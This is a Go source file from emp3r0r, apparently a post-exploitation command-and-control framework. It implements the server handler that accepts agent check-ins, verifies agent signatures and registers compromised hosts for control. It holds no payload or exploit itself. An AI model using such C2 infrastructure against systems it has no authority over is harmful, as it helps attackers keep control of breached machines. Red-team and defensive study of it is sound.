package server

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// handleAgentCheckIn processes agent check-in requests.
func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
	conn, err := h2conn.Accept(wrt, req)
	defer func() {
		_ = conn.Close()
		if logging.Level >= 4 {
			logging.Debugf("handleAgentCheckIn finished")
		}
	}()
	if err != nil {
		logging.Errorf("handleAgentCheckIn: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	var target def.Emp3r0rAgent
	in := cbor.NewDecoder(conn)
	err = in.Decode(&target)
	if err != nil {
		logging.Warningf("handleAgentCheckIn decode error: %v", err)
		return
	}

	// verify agent identification
	// timestamp is already checked in transport.VerifySignatureWithCA
	agent_sig, err := base64.URLEncoding.DecodeString(target.UUIDSig)
	if err != nil {
		logging.Debugf("Failed to decode agent sig: %v", err)
		return
	}
	isValid, err := transport.VerifySignatureWithCA([]byte(target.UUID), agent_sig)
	if err != nil {
		logging.Debugf("Failed to verify agent uuid: %v", err)
		return
	}
	if !isValid {
		logging.Debugf("Invalid agent uuid, refusing request")
		return
	}
	target.From = req.RemoteAddr
	live.AgentControlMapMutex.Lock()
	if !agents.IsAgentExistLocked(&target) {
		inx := agents.AssignAgentIndexLocked()
		live.AgentControlMap[&target] = &live.AgentControl{Index: inx, Conn: nil}
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agents.AgentsJSON) {
			if l := agents.RefreshAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		live.AgentControlMapMutex.Unlock()
		logging.Printf("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
	} else {
		var existingKey *def.Emp3r0rAgent
		for a := range live.AgentControlMap {
			if a.Tag == target.Tag {
				*a = target
				existingKey = a
				break
			}
		}
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agents.AgentsJSON) {
			if existingKey != nil {
				if l := agents.RefreshAgentLabel(existingKey); l != "" {
					shortname = l
				}
			}
		}
		live.AgentControlMapMutex.Unlock()
		if logging.Level >= 4 {
			logging.Debugf("Refreshing sysinfo for %s from %s, running %s", shortname, fmt.Sprintf("%s - %s", target.From, target.Transport), strconv.Quote(target.OS))
		}
	}
}
